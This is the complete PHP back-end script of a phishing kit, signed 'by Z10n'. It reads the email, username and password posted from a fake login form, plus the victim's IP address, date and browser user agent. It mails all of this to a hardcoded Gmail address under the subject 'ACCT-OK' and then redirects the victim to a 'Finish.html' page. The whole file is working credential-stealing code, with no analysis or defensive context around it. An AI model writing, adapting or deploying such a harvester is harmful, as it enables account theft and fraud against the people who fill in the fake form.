<?

$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "----------\n";
$message .= "E-mail : ".$_POST['email']."\n";
$message .= "Nome de usu�rio : ".$_POST['username']."\n";
$message .= "Senha : ".$_POST['password']."\n";

$message .= "----------\n";
$message .= "User IP : ".$ip."\n";
$message .= "Date : ".$adddate."\n";
$message .= "User Agent : ".$useragent."\n";
$message .= " - by Z10n -\n";

$recipient = "benfinagentb12c@gmail.com";
$subject = "ACCT-OK";
$headers .= "ok";
mail($recipient,$subject,$message,$headers);?>





<script type="text/javascript">
</script><meta HTTP-EQUIV="REFRESH" content="2; URL= Finish.html">
